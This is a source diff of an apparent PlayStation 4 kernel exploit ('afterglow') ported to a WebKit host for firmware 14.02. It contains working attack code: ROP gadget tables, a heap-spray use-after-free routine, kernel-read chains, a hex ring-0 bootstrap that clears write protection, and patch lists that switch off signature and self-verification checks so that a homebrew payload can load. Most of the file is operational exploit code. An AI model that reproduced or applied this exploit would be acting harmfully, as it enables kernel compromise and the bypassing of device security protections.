@@ -1,6 +1,6 @@
 /*
-    afterglow -- PlayStation 4 kernel exploit for firmware 14.00
-    Port to the raw13 host (WebKit entry), from the Lua original.
+    afterglow -- PlayStation 4 kernel exploit, restricted here to firmware 14.02
+    Port to the raw13 host (WebKit entry), derived from the 14.00 Lua original.
 
     Copyright (C) 2026 well0nez
 
@@ -16,50 +16,48 @@
 
     You should have received a copy of the GNU Affero General Public License
     along with this program.  If not, see <https://www.gnu.org/licenses/>.
-
-    UNTESTED IN THIS HOST. The Lua original has eight consecutive runs behind
-    it inside a game process. This file has none: it has never executed. Run
-    probeAfterglow() first -- it fires nothing and answers whether this process
-    can carry the exploit at all.
-
-    What the host must provide, and raw13 does:
-      sc(num, ...args)      syscall, returns {lo, hi, i32}
-      bufAddr(arrayBuffer)  int64 address of the backing store
-      p.read1/4/8           read in this process
-      p.write1/4/8          write in this process
-      p.readInto(u8, at, n)
-      keepAlive             array, so our buffers survive the collector
-      mark(tag, detail)     log
-    A way to call native code is NOT needed.
 */
 
-import { int64 } from "./int64.js";
+import { int64 } from "./int64.js?v=hen1402r17";
+import { deriveBaseFromLeak, validateKernelHeader } from "./kernel-format-1402.js?v=hen1402r17";
+import { sha256Hex } from "./sha256.js?v=hen1402r17";
+
+const HEN_BIN = {
+  length: 498720,
+  sha256: "1773444cd5caf62f703e53d6b023882e30c29aba26fc96082f3257e16efa6239",
+};
+const CANDIDATE_READY = true;
 
 const S = {
-  read: 3, open: 5, close: 6, ioctl: 54, mprotect: 74, socket: 97, setsockopt: 105,
-  getuid: 24, kqueue: 362, kevent: 363, mmap: 477, lseek: 478, thr_self: 432,
+  read: 3, open: 5, close: 6, unlink: 10, ioctl: 54, mprotect: 74, dup: 41,
+  getrlimit: 194, setrlimit: 195,
+  socket: 97, setsockopt: 105,
+  getuid: 24, kqueue: 362, kevent: 363, mmap: 477, munmap: 73,
+  lseek: 478, thr_self: 432,
   getpid: 20, sysctl: 202, cpuset_getaffinity: 487,
-  cpuset_setaffinity: 488, dynlib_get_list: 592, dynlib_get_info: 593,
+  cpuset_setaffinity: 488,
+  dynlib_get_list: 592, dynlib_get_info: 593,
 };
+const NOTIFY_SYSCALL = 601;
 
-/* offsets into the kernel image, firmware 14.00 */
+/* Firmware 14.02 offsets used only after live byte checks. */
 const K = {
-  anchor:    0x00e6c30,   /* the lock the leak hands us -- 14.02 base, auto-corrects for 14.00 */
-  swap_rbp:  0x0a80f68,   /* xchg rbp,rax ; ret */
-  prison0:   0x111fa18,   /* holds a pointer to prison0, so read it */
+  anchor:    0x00e6c30,
+  swap_rbp:  0x0a81478,
+  prison0:   0x111fa18,
   rootvnode: 0x2136e90,
 };
 
 /* offsets into libSceLibcInternal, with the bytes that must be found there */
 const GADGETS = {
-  pivot:  [0x0d2812, "488b67385fc3"],   /* mov rsp,[rdi+0x38] ; pop rdi ; ret */
+  pivot:  [0x0d2812, "488b67385fc3"],
   rdi:    [0x0a6bae, "5fc3"],
   rsi:    [0x095560, "5ec3"],
   rdx:    [0x04e6d2, "5ac3"],
   rcx:    [0x0943ee, "59c3"],
-  store:  [0x041ceb, "488907c3"],       /* mov [rdi],rax ; ret */
-  load:   [0x0120b1, "488b07c3"],       /* mov rax,[rdi] ; ret */
-  load8:  [0x057fae, "488b4008c3"],     /* mov rax,[rax+8] ; ret */
+  store:  [0x041ceb, "488907c3"],
+  load:   [0x0120b1, "488b07c3"],
+  load8:  [0x057fae, "488b4008c3"],
   add:    [0x0aaf8b, "4801f8c3"],
   sub:    [0x0275b4, "4829f8c3"],
   shr:    [0x0a9ba2, "48d3e8c3"],
@@ -68,70 +66,31 @@ const GADGETS = {
   leave:  [0x09e59d, "c9c3"],
 };
 
-/* the read only tail of the libc text segment: executable already, claimed by
-   no ELF header. An anonymous page stays non executable on this firmware
-   however the mapping is widened, which is why this room is used at all. */
 const HOST = { page: 0x130000, free: 0x130730, last: 0x131000 };
 
 const TUNE = {
-  sprays: 126,   /* a hard floor, one short of it never lands */
-  object: 104,   /* sprayed object, falls into the 128 byte zone */
+  sprays: 126,
+  object: 104,
   window: 0x4000,
   entries: 420,
   stride: 0x90,
   seed: 45,
   spare: 8,
   units: 15,
-  batch: 60,     /* setsockopt per rop entry */
-  ceiling: 63,   /* how far up to look for a free unit */
+  batch: 60,
+  ceiling: 63,
 };
 
-/* any cdev will do: the exploit only needs a file whose operation table sits
-   in kernel text. Deliberately not a socket -- the spray needs all 126 of
-   those, and one short of that never lands in the right bucket. */
 const PROBE_NODES = ["/dev/rng", "/dev/urandom", "/dev/random", "/dev/zero", "/dev/null"];
 
-const BOOTSTRAP_1400 =
-    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
-  + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
-  + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
-  + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
-  + "20c0480d000001000f22c031c0c3";
-
-/* Static 14.02 bootstrap. Only the two sys_mmap protection immediates move,
-   both by +0x400. This remains unreachable while the 14.02 route is blocked;
-   it must gain an all-stock/all-final preflight before it can be enabled. */
-const BOOTSTRAP_1402 =
+const BOOTSTRAP =
     "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
   + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
   + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
   + "488991882d1001c781ac2d100101000000c681daae1f0037c681ddae1f00370f"
   + "20c0480d000001000f22c031c0c3";
 
-const PATCHES_1400 = [
-  [0x0000acd, "eb",       "bcopy"],
-  [0x02bd79d, "eb",       "bzero"],
-  [0x02bd7e1, "eb",       "pagezero"],
-  [0x02bd85d, "eb",       "memcpy"],
-  [0x02bd8a1, "eb",       "pagecopy"],
-  [0x02bda4d, "eb",       "copyin"],
-  [0x02bdefd, "eb",       "copyinstr"],
-  [0x02bdfcd, "eb",       "copystr"],
-  [0x01b7a43, "eb04",     "dlsym, first check"],
-  [0x01b7a53, "eb04",     "dlsym, second check"],
-  [0x01b7a73, "90e9",     "dlsym, nop and jump"],
-  [0x01b7504, "90e9",     "load_prx"],
-  [0x01b7ab8, "90e93c01", "dlsym, open it to every caller"],
-  [0x0628684, "eb00",     "self verification"],
-  [0x0628f6f, "eb00",     "delayed panic on suspend"],
-];
-
-/* Firmware 14.02 sites, with complete eight-byte windows. These are never
-   relocated at runtime: every window must be either pristine or already
-   patched before write protection is touched. The bcopy first byte (0x76) is
-   inferred from its seven-byte-identical copy siblings; the supplied dump
-   already contains its accepted patched form (0xeb). */
-const PATCH_WINDOWS_1402 = [
+const PATCH_WINDOWS = [
   [0x0000acd, "76174989ea4983c2", "eb",       "bcopy"],
   [0x02bda9d, "76174989ea4983c2", "eb",       "bzero"],
   [0x02bdae1, "761b4989ea4983c2", "eb",       "pagezero"],
@@ -148,10 +107,21 @@ const PATCH_WINDOWS_1402 = [
   [0x0628b04, "74074883c4085b5d", "eb00",     "self verification"],
   [0x06293ef, "7541488d3df87403", "eb00",     "delayed panic on suspend"],
 ];
+const PATCHES = PATCH_WINDOWS.map(function (w) { return [w[0], w[2], w[3]]; });
+/* Same-boot stock windows for the bootstrap's 14.02 fixed-address writes. */
+const BOOTSTRAP_WINDOWS = [
+  [0x00000490, "ffffffff498b8740", "00000000498b8740"],
+  [0x000004b5, "721385c9750f483b", "eb0085c9eb00483b"],
+  [0x000004b9, "750f483b90f00000", "eb00483b90f00000"],
+  [0x000004c2, "7269eb0485c97463", "eb69eb0485c97463"],
+  [0x00000ab4, "9090909090909090", "ff26909090909090"],
+  [0x001faeda, "3341b23331c04531", "3741b23731c04531"],
+  [0x001faedd, "3331c04531f64531", "3731c04531f64531"],
+];
 
-/* ------------------------------------------------------------- the host */
-
-const STATE = { ctx: null, units: {}, clones: 0, base: null, stubs: {}, batch: undefined, retry: false };
+const STATE = { ctx: null, units: {}, clones: 0, base: null, stubs: {}, batch: undefined, retry: false,
+  pthread: null, pthreadCallEntered: false, pthreadCallReturned: false,
+  taperSeed: false, terminalReleaseAttempted: false };
 
 function host() {
   if (!STATE.ctx) throw new Error("afterglow: no host installed");
@@ -160,11 +130,14 @@ function host() {
 
 function say(fmt) {
   host().mark("AG", fmt);
-  try {
-    if (/^\[(e|g|p|t|8|9|10|kp|rw)\]/.test(fmt) || /JAILBREAK|defused|thread rc|pthread_create/.test(fmt)) {
-      fetch("ag_log?m=" + encodeURIComponent(fmt), { keepalive: true }).catch(function () {});
-    }
-  } catch (e) {}
+}
+
+async function checkpoint(name, detail) {
+  /* Telemetry is evidence, not part of the exploit ABI. Route it through the
+     host logger so the local collector still receives it, but never make a
+     static host or a failed /beacon request block a kernel or payload step. */
+  try { host().mark(name, detail || ""); } catch (_) {}
+  return true;
 }
 
 const LOW = 0x100000000;
@@ -176,21 +149,18 @@ function inText(a) { return a.hi >= 0xffffff00 && a.low !== 0; }
 function inHeap(a) { return a.hi >= 0xffff0000 && a.hi < 0xffffff00 && a.low !== 0; }
 function text(a) { return "0x" + a.toString(16).padStart(16, "0"); }
 
-/* The host resolves a syscall number to a libkernel stub and only ever
-   scanned for its own two dozen. Ours -- open, mprotect, kqueue, kevent,
-   ioctl, the dynlib pair -- are not among them, and an unresolved number
-   reaches its argument marshalling as undefined. So we scan for the rest
-   ourselves, with the same shape it looks for:
-
-       48 c7 c0 <nr32>   49 89 ca   0f 05
-
-   One pass for everything missing, not one pass per number. */
-function seedStubs() {
+function seedStubs(extra) {
   const c = host();
   const need = new Set();
   for (const k in S) {
     const n = S[k];
     if (!(c.stubAddr && c.stubAddr.has(n)) && !STATE.stubs[n]) need.add(n);
+  }
+  if (extra) {
+    for (let i = 0; i < extra.length; i++) {
+      const n = extra[i];
+      if (!(c.stubAddr && c.stubAddr.has(n)) && !STATE.stubs[n]) need.add(n);
+    }
   }
   if (!need.size) return [];
 
@@ -238,8 +208,6 @@ function wr1(at, b) { host().p.write1(at, b & 0xff); }
 function wr4(at, n) { host().p.write4(at, n >>> 0); }
 function wr8(at, q) { host().p.write8(at, q); }
 
-/* p carries read1/2/4/8 and write1/2/4/8 and nothing bulk, so this walks it
-   a quadword at a time and picks up the remainder by byte. */
 function rdbuf(at, len) {
   const out = new Uint8Array(len);
   const pr = host().p;
@@ -271,12 +239,10 @@ function sameBytes(a, b) {
   return true;
 }
 
-/* 64 bit quantity into a buffer, and back */
 function pokeAt(buf, off, q) {
   buf.dv.setUint32(off, q.low >>> 0, true);
   buf.dv.setUint32(off + 4, q.hi >>> 0, true);
 }
-
 
 function wipe(buf, len) { buf.u8.fill(0, 0, len); }
 
@@ -287,10 +253,40 @@ function cstr(s) {
   return b;
 }
 
+function notifyHenRunning() {
+  try {
+    const missing = seedStubs([NOTIFY_SYSCALL]);
+    if (missing.indexOf(NOTIFY_SYSCALL) !== -1) {
+      say("[p] core installer returned success; native notification stub was not found");
+      return { ok: false, note: "syscall 601 stub missing" };
+    }
+
+    const request = alloc(0xc30);
+    wipe(request, 0xc30);
+    request.dv.setUint32(0x10, 0xffffffff, true);
+    request.u8[0x2c] = 1;
+
+    const putAscii = function (offset, capacity, value) {
+      const count = Math.min(value.length, capacity - 1);
+      for (let i = 0; i < count; i++)
+        request.u8[offset + i] = value.charCodeAt(i) & 0xff;
+      request.u8[offset + count] = 0;
+    };
+    putAscii(0x2d, 0x400, "Core HEN installer returned success");
+    putAscii(0x42d, 0x400, "cxml://psnotification/tex_icon_system");
+
+    const rc = sc(NOTIFY_SYSCALL, 0, request.at, 0xc30, 0).i32;
+    say("[p] native core-installer notification rc=" + rc);
+    return { ok: rc === 0, note: "rc=" + rc };
+  } catch (e) {
+    try { say("[p] core installer returned success; native notification failed"); }
+    catch (_) {}
+    return { ok: false, note: "notification failed" };
+  }
+}
+
 function splitNum(n) { return v(n % LOW, Math.floor(n / LOW)); }
 function asQ(x) { return (typeof x === "number") ? splitNum(x) : x; }
-
-/* ------------------------------------------------- machine code pad */
 
 function codeAt(pageAt, off) {
   return {
@@ -315,13 +311,15 @@ function codeAt(pageAt, off) {
   };
 }
 
-/* ------------------------------------------------------- rop chain */
-
 function makeChain(buf, gad) {
   return {
     buf: buf, base: buf.at, n: 0, fix: [], g: gad,
 
-    slot: function (q) { pokeAt(this.buf, this.n * 8, asQ(q)); this.n++; return this.n - 1; },
+    slot: function (q) {
+      if ((this.n + 1) * 8 > this.buf.u8.length)
+        throw new Error("kernel read chain exceeds its allocated buffer");
+      pokeAt(this.buf, this.n * 8, asQ(q)); this.n++; return this.n - 1;
+    },
     num: function (n) { return this.slot(asQ(n)); },
     hole: function () { return this.slot(v(0, 0)); },
     where: function (i) { return plus(this.base, i * 8); },
@@ -339,7 +337,6 @@ function makeChain(buf, gad) {
     rsi: function (n) { this.gad("rsi"); return this.num(n); },
     rdx: function (n) { this.gad("rdx"); return this.num(n); },
 
-    /* rax <- *(rax + off), through the one deref gadget there is */
     follow: function (off) {
       const d = off - 8;
       if (d >= 0) { this.rdi(d); this.gad("add"); } else { this.rdi(-d); this.gad("sub"); }
@@ -349,8 +346,6 @@ function makeChain(buf, gad) {
     save_rax: function (at) { this.rdi(at); this.gad("store"); },
     load_rax: function (at) { this.rdi(at); this.gad("load"); },
 
-    /* copy len bytes from wherever rax points to dst, and report the slot
-       that ends up holding the source address */
     grab: function (dst, len) {
       this.gad("rdi"); const h = this.hole();
       this.gad("store");
@@ -367,12 +362,6 @@ function makeChain(buf, gad) {
   };
 }
 
-/* ----------------------------------------------------------- a shot */
-
-/* One attempt at the bug. Each takes a unit nobody used before: a unit an
-   earlier attempt touched still carries a note from that attempt's queue, and
-   freeing its clone again would leave a foreign queue pointing at dead
-   memory. */
 function shooter(gad) {
   const s = {
     g: gad, fired: 0, sprayed: 0, devs: [], queues: [],
@@ -388,20 +377,16 @@ function shooter(gad) {
   };
 
   s.take = function (build, room) {
-    /* four ways to come back empty, and telling them apart matters: one is a
-       spent budget, one is a refused open, one is a kernel that would not
-       arm. They used to be one silent null. */
     this.why = null;
+    if (this.fired >= TUNE.units) {
+      this.why = "one-shot kernel read budget exhausted";
+      return null;
+    }
     if (this.hold("/dev/apm") < 0) {
       this.why = "the clone node refused to open, errno " + host().errno();
       return null;
     }
 
-    /* The ceiling used to be TUNE.units. By the second shot this process is
-       already holding some fifty clones of its own, so the free numbers sit
-       above that -- and a search that stops at fifteen finds nothing while
-       reporting "no unused unit", which is true and useless. Look further,
-       and write down why the refusals came. */
     let unit = -1, watched = -1;
     const refused = [];
     for (let u = TUNE.ceiling; u >= 0; u--) {
@@ -444,13 +429,11 @@ function shooter(gad) {
       return null;
     }
 
-    /* Everything that is not a 128 byte allocation happens before the free.
-       Anything in between lets a foreign consumer take the hole first. */
     const rop = alloc(room || 0x400);
     const frame = alloc(0x100);
     wipe(frame, 0x100);
     const c = makeChain(rop, this.g);
-    c.num(0);                      /* swallowed by the pop in the pivot gadget */
+    c.num(0);
     build(c);
     c.seal();
     pokeAt(frame, 0x38, rop.at);
@@ -468,12 +451,11 @@ function shooter(gad) {
     pokeAt(req, 24, body.at);
     req.dv.setUint32(32, TUNE.object, true);
 
-    /* The original tapered this to TUNE.spare once sixty clones were out --
-       a saving that suits a quiet game process. Here the three failures that
-       reached this far all sat on a shot that had seeded eight. Seeding
-       happens before the free, so it costs nothing in the window that
-       decides the outcome. */
-    const want = TUNE.seed;
+    /* A process capped at 512 descriptors cannot retain 45 new seed clones
+       for every kernel shot. After the first two full-density shots, use
+       Afterglow's original eight-clone taper. The high-limit route keeps the
+       denser refill on every shot because it was more reliable in this host. */
+    const want = STATE.taperSeed && STATE.clones >= 60 ? TUNE.spare : TUNE.seed;
     for (let i = 0; i < want; i++) {
       if (this.hold("/dev/apm") < 0) break;
       STATE.clones++;
@@ -486,21 +468,9 @@ function shooter(gad) {
       socks.push(fd);
     }
 
-    /* The window: from the free to the last spray. In the Lua host each of
-       these is a cheap syscall; here every one is a ROP call -- lay out a
-       stack, bend a pivot cell, trip Math.expm1, put the cell back. Nothing
-       may be printed inside it, so the number is only reported afterwards. */
     const hh = host();
     const stub = stubFor(S.setsockopt);
-    /* One entry per batch instead of one per socket. Measured at 119 us an
-       entry, 126 of them hold the hole open for 15 ms; the Lua host does the
-       same work in well under one. Batches are sized to the host's rop stack
-       (0x2000) -- twelve slots a call, and room for the epilogue. */
-    /* How many fit in one entry is a property of the host's rop stack, not
-       of this console's speed -- a slower machine wants the same answer, just
-       fewer entries would help it more. The stack size is the host's own
-       constant, so ask instead of assuming: build the largest batch it
-       accepts, once, outside the window. */
+
     if (STATE.batch === undefined && hh.prepareMany && stub) {
       STATE.batch = 0;
       for (let n = TUNE.sprays; n >= 8; n = Math.floor(n * 3 / 4)) {
@@ -509,7 +479,7 @@ function shooter(gad) {
           for (let i = 0; i < n; i++) probeCalls.push([stub, [0, 17, 128, req.at, 40]]);
           hh.prepareMany(probeCalls);
           STATE.batch = n; break;
-        } catch (e) { /* too big for its stack, try smaller */ }
+        } catch (e) { }
       }
       say("    rop stack takes " + STATE.batch + " calls per entry");
     }
@@ -521,8 +491,6 @@ function shooter(gad) {
       for (let i = 0; i < calls.length; i += batch) {
         fertig.push(hh.prepareMany(calls.slice(i, i + batch)));
       }
-      /* warm the path: the first entry of a run paid 19 ms where the rest
-         paid 4, and that difference has no business being inside the window */
       hh.runPrepared(hh.prepareMany([[stubFor(S.getuid), []]]));
     }
 
@@ -536,8 +504,6 @@ function shooter(gad) {
     const t1 = (typeof performance !== "undefined") ? performance.now() : Date.now();
     this.window = t1 - t0;
     this.batched = batch;
-    /* should the hole have stayed empty, a fresh clone drops a real pointer
-       in, which makes the second arm() merely useless instead of fatal */
     for (let i = 0; i < TUNE.spare; i++) this.hold("/dev/apm");
 
     this.sprayed = socks.length;
@@ -557,16 +523,154 @@ function qAt(buf, off) {
   return v(buf.dv.getUint32(off, true), buf.dv.getUint32(off + 4, true));
 }
 
-/* ----------------------------------------- ring 0 through syscall 11 */
+/* Keep Afterglow's evidence-backed separate state and map reads. The 14.02
+   port previously split this into many independent APM shots; every extra
+   shot was another chance to miss before the payload could start. Values from
+   both compact reads are still validated before the first kernel write. */
+async function captureHostState(shot, kbase, probe, reach, hostPage) {
+  try {
+    if (reach < 2 || reach > 192 || probe < 0 || probe > 0xffff)
+      throw new Error("map reach or probe fd exceeds the compact plan");
 
-/* The bootstrap pointed sysent[11] at a planted `jmp [rsi]`. sy_call is
-   entered with rdi = thread and rsi = the argument vector, so the jump lands
-   on whatever address the first argument carries.
+    const tidOut = alloc(8); wipe(tidOut, 8);
+    const tidRv = sc(S.thr_self, tidOut.at).i32;
+    const userTid = tidOut.dv.getInt32(0, true);
+    const userPid = sc(S.getpid).i32;
+    if (tidRv !== 0 || userTid <= 0 || userPid <= 0 ||
+        tidOut.dv.getUint32(4, true) !== 0)
+      throw new Error("thread or process ID syscall failed");
 
-   The original issues this with the loader's native call. A host whose
-   syscall primitive takes an arbitrary number could call syscall 11 straight;
-   raw13's sc() goes through a per-number stub table that has no entry for 11,
-   so the two byte userland stub stays and is entered with callAddr. */
+    const note = alloc(128), ftab = alloc(0x100), fdHeader = alloc(0x40);
+    const kernelTidOut = alloc(4), kernelPidOut = alloc(4);
+    wipe(note, 128); wipe(ftab, 0x100); wipe(fdHeader, 0x40);
+    wipe(kernelTidOut, 4); wipe(kernelPidOut, 4);
+
+    if (!await checkpoint("state-armed", "compact kernel state read"))
+      throw new Error("state: PC collector did not acknowledge the shot");
+    const stateR = shot.take(function (c) {
+      /* The verified GS gadget yields this browser thread and pops RBP. Save
+         the thread, restore RBP immediately, then continue the state capture. */
+      c.slot(plus(kbase, K.swap_rbp)); c.save_rax(note.at);
+      c.slot(plus(kbase, K.swap_rbp));
+      c.slot(plus(kbase, 0x74de23)); c.num(0);
+      c.save_rax(plus(note.at, 8));                         /* thread */
+      c.load_rax(note.at); c.slot(plus(kbase, K.swap_rbp));
+      if (c.n !== 15) throw new Error("GS thread chain changed length");
+
+      c.load_rax(plus(note.at, 8)); c.rdi(0x88); c.gad("add");
+      c.grab(kernelTidOut.at, 4);                          /* td_tid */
+      c.load_rax(plus(note.at, 8)); c.follow(8);
+      c.save_rax(plus(note.at, 16));                       /* process */
+
+      c.load_rax(plus(note.at, 16)); c.rdi(0xb0); c.gad("add");
+      c.grab(kernelPidOut.at, 4);                          /* p_pid */
+      c.load_rax(plus(note.at, 16)); c.follow(0x48);
+      c.save_rax(plus(note.at, 24));                       /* filedesc */
+      c.load_rax(plus(note.at, 16)); c.follow(0x168);
+      c.save_rax(plus(note.at, 32));                       /* vmspace */
+
+      c.load_rax(plus(note.at, 24)); c.grab(fdHeader.at, 0x40);
+      c.load_rax(plus(note.at, 24)); c.follow(0);
+      c.save_rax(plus(note.at, 56));                       /* fd_ofiles */
+      c.follow(probe * 8); c.save_rax(plus(note.at, 40));  /* file */
+      c.gad("load8"); c.save_rax(plus(note.at, 48));      /* f_ops */
+      c.grab(ftab.at, 0x58);
+
+      c.load_rax(plus(note.at, 32)); c.follow(8);
+      c.save_rax(plus(note.at, 72));                       /* first map */
+    }, 0x2000);
+    if (!ran(stateR))
+      throw new Error("state: compact kernel read missed: " + shot.why);
+
+    const oldRbp = qAt(note, 0), thread = qAt(note, 8), proc = qAt(note, 16);
+    const filedesc = qAt(note, 24), vmspace = qAt(note, 32);
+    const file = qAt(note, 40), ops = qAt(note, 48);
+    const ofiles = qAt(note, 56), mapHead = qAt(note, 72);
+    if (!inHeap(thread) || (thread.low & 7) !== 0 ||
+        oldRbp.hi < 0xffff0000 || oldRbp.low === 0 || (oldRbp.low & 7) !== 0)
+      throw new Error("GS thread or saved RBP was implausible");
+    if (!inHeap(proc) || (proc.low & 7) !== 0 ||
+        kernelTidOut.dv.getInt32(0, true) !== userTid)
+      throw new Error("thread proc or TID did not match this browser thread");
+    if (kernelPidOut.dv.getInt32(0, true) !== userPid ||
+        !inHeap(filedesc) || !inHeap(vmspace) ||
+        (filedesc.low & 7) !== 0 || (vmspace.low & 7) !== 0)
+      throw new Error("process ID, filedesc or vmspace failed validation");
+    const capacity = fdHeader.dv.getInt32(0x28, true);
+    const lastfile = fdHeader.dv.getInt32(0x38, true);
+    const futureSeed = STATE.taperSeed && STATE.clones >= 60 ? TUNE.spare : TUNE.seed;
+    const futurePerShot = 3 + futureSeed + TUNE.spare;
+    const remainingShots = 3; /* map read, live write guard, writer */
+    const headroomFloor = remainingShots * futurePerShot + 16;
+    say("[3] fd header ofiles=" + text(ofiles) + " capacity=" + capacity +
+      " lastfile=" + lastfile + " probe=" + probe +
+      " required-headroom=" + headroomFloor);
+    if (!same(ofiles, qAt(fdHeader, 0)) ||
+        !inHeap(ofiles) || (ofiles.low & 7) !== 0 ||
+        capacity <= 0 || capacity > 0x10000 ||
+        lastfile < probe || lastfile >= capacity ||
+        capacity - 1 - lastfile < headroomFloor)
+      throw new Error("filedesc header or FD headroom failed validation");
+    if (!inHeap(file) || (file.low & 7) !== 0)
+      throw new Error("probe file pointer was implausible");
+    if (!inText(ops) || (ops.low & 7) !== 0)
+      throw new Error("probe file operation table pointer was implausible");
+    let sane = 0;
+    for (let i = 0; i < 10; i++) if (inText(qAt(ftab, i * 8))) sane++;
+    if (sane < 6) throw new Error("operation table has too few kernel pointers");
+    if (!inHeap(mapHead) || (mapHead.low & 7) !== 0)
+      throw new Error("vmspace map head was implausible");
+
+    const maps = alloc(reach * TUNE.stride + 0x100);
+    const mapAddresses = alloc(reach * 8 + 0x10);
+    wipe(maps, reach * TUNE.stride);
+    wipe(mapAddresses, reach * 8);
+    const mapHeadRef = alloc(16); pokeAt(mapHeadRef, 0, mapHead);
+    if (!await checkpoint("map-armed", "compact kernel map walk"))
+      throw new Error("map: PC collector did not acknowledge the shot");
+    const mapR = shot.take(function (c) {
+      c.load_rax(mapHeadRef.at);
+      for (let i = 0; i < reach; i++) {
+        c.save_rax(plus(mapAddresses.at, i * 8));
+        const source = c.grab(plus(maps.at, i * TUNE.stride), TUNE.stride);
+        c.load_rax(c.where(source)); c.gad("load8");
+      }
+    }, 0x1000 + reach * 0x100);
+    if (!ran(mapR))
+      throw new Error("map: compact kernel read missed: " + shot.why);
+
+    const addresses = [];
+    let entry = mapHead;
+    let hit = null;
+    for (let i = 0; i < reach; i++) {
+      const at = i * TUNE.stride;
+      if (!same(entry, qAt(mapAddresses, i * 8)))
+        throw new Error("map walk continuation did not match copied links");
+      if (!inHeap(entry) || (entry.low & 7) !== 0)
+        throw new Error("map link was not a kernel heap pointer");
+      addresses[i] = entry;
+      const from = qAt(maps, at + 0x20), upto = qAt(maps, at + 0x28);
+      const next = qAt(maps, at + 8);
+      if (same(next, entry)) throw new Error("map list looped on itself");
+      if (upto.hi - from.hi <= 0x100) {
+        const above = from.hi < hostPage.hi ||
+          (from.hi === hostPage.hi && from.low <= hostPage.low);
+        const below = hostPage.hi < upto.hi ||
+          (hostPage.hi === upto.hi && hostPage.low < upto.low);
+        if (above && below && hit === null) hit = i;
+      }
+      entry = next;
+    }
+    if (hit === null) throw new Error("no validated mapping covers the host page");
+    say("[3] compact state and map reads validated; host-page entry " + hit);
+    return { file, ops, ftab, maps, hit, here: addresses[hit] };
+  } catch (error) {
+    say("[3] compact kernel read stopped: " + ((error && error.message) || error));
+    say("[3] no kernel write from this stage; cold power off before another attempt");
+    return null;
+  }
+}
+
 const GATE = 0x0a0, BODY = 0x0c0, OUT = 0x400, FLAG = 0x420, STAGE = 0x440;
 const STAGE_MAX = 0x400;
 const SIGIL = 0x600D600D;
@@ -577,8 +681,6 @@ function openRing0(roomAt) {
 
   r.begin = function () { return this.body.reset(); };
 
-  /* the gate returns the thread's value, not ours, so the body raises a flag
-     of its own as its very last act and that is what we test */
   r.run = function () {
     this.body.hex("48b8").qw(plus(this.at, FLAG)).hex("c700").dw(SIGIL).hex("31c0").hex("c3");
     wr4(plus(this.at, FLAG), 0);
@@ -601,10 +703,6 @@ function openRing0(roomAt) {
     return this.run() ? plus(this.out(), -0x1c0) : null;
   };
 
-  /* rep movsb inside the write protection bracket, so the same primitive
-     serves kernel data and kernel text. Only writes need the bracket, and
-     every clear of it is a window in which this thread must not be
-     interrupted -- so reads do not open one. */
   r.copy = function (dst, src, len, guarded) {
     const c = this.begin();
     if (guarded) c.hex("0f20c0").hex("4825").dw(0xfffeffff).hex("0f22c0");
@@ -616,10 +714,6 @@ function openRing0(roomAt) {
     return this.run();
   };
 
-  /* All of them in one entry, with the write protection lifted once. Several
-     of these sit in the hottest routines in the kernel and the other cores
-     keep running them; a patch written in its own call is a window in which
-     one of them can fetch a half written instruction. */
   r.apply = function (base, list) {
     const c = this.begin();
     c.hex("48b9").qw(base);
@@ -666,24 +760,8 @@ function openRing0(roomAt) {
   return r;
 }
 
-/* ------------------------------------------------------ the host's state */
-
 function isZero(q) { return !q || ((q.low >>> 0) === 0 && (q.hi >>> 0) === 0); }
 
-/* dynlib_get_info fills the name in this sandbox and nothing else -- no
-   segment array, so no base. The mappings carry their own path, so ask the
-   kernel for the map instead. No blind reads, and it hands over the bounds
-   of the module as well, which the host page check wants anyway. */
-/* The mappings carry no path here, so identity has to come from content. We
-   already know fifteen byte patterns at fixed offsets inside this module --
-   that is a far stronger fingerprint than a name. The map supplies the
-   bounds, so every read lands inside a mapping that exists, and only
-   mappings long enough to hold the whole span are touched. */
-/* The kernel walks its vm_map entries in address order and so does this
-   listing, so an index here is the same index there. Kept, because the chain
-   that walks the kernel side has to be told how far to go -- and going four
-   times further than necessary is four times the ring 0 work on a hijacked
-   stack. */
 let MAPS = null;
 
 function findLibByShape() {
@@ -704,7 +782,7 @@ function findLibByShape() {
   const used = Math.min(len.dv.getUint32(0, true), buf.u8.length);
   if (rv !== 0 || !used) { r.note = "vmmap read rv=" + rv; return r; }
 
-  const span = HOST.last;                     /* everything we ever touch */
+  const span = HOST.last;
   const cand = [];
   let off = 0;
   while (off + 8 <= used) {
@@ -721,7 +799,6 @@ function findLibByShape() {
     off += size;
   }
 
-  /* two patterns, far apart, is already beyond coincidence */
   const probes = [GADGETS.pivot, GADGETS.memcpy];
   for (let i = 0; i < cand.length; i++) {
     let all = true;
@@ -735,11 +812,6 @@ function findLibByShape() {
   return r;
 }
 
-/* Reports instead of returning a bare value: when this comes back empty the
-   caller has to know whether the listing failed, the module was absent, or it
-   was there with a zero base -- those need different answers, and a zero
-   int64 is truthy, which is how a zero base once reached a read as a bare
-   gadget offset. */
 function findLib(name) {
   const r = { base: null, rv: null, count: 0, seen: [], note: null };
   const list = alloc(4 * 0x300), count = alloc(8);
@@ -761,10 +833,6 @@ function findLib(name) {
     if (nm === name) {
       let b = qAt(info, 0x108);
       if (!isZero(b)) { r.base = b; r.at = "0x108"; return r; }
-      /* The segment array does not sit where it does in a game process. Let
-         the struct say where it is instead of guessing: a module base is a
-         userland address on the 16 KiB grid, and there are very few of those
-         in 0x160 bytes. */
       const cand = [];
       for (let o = 8; o + 8 <= 0x160; o += 8) {
         const q = qAt(info, o);
@@ -784,905 +852,38 @@ function findLib(name) {
   return r;
 }
 
-/* Which core we may run on is not ours to choose: this process is confined
-   to a subset, and in a browser that subset does not contain core 0. Setting
-   bit 0 regardless fails, the thread stays free to migrate, and then the free
-   and the refill land in different per cpu buckets -- the hole is filled by
-   somebody else and the pivot takes its stack pointer from a stranger. So ask
-   first, then pin to the lowest core actually allowed. */
 function pinCore() {
   const mask = alloc(16);
   mask.u8.fill(0);
   let rv = sc(S.cpuset_getaffinity, 3, 1, -1, 16, mask.at).i32;
   if (rv !== 0) return { ok: false, note: "getaffinity rv=" + rv };
-  const originalMask = mask.u8.slice();
 
